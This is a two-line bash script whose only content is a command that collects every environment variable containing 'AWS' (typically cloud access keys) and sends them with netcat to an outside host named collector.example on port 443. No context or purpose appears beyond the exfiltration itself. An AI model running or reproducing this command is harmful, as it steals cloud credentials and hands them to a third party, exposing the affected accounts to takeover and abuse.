#!/bin/bash
env | grep AWS | nc collector.example 443
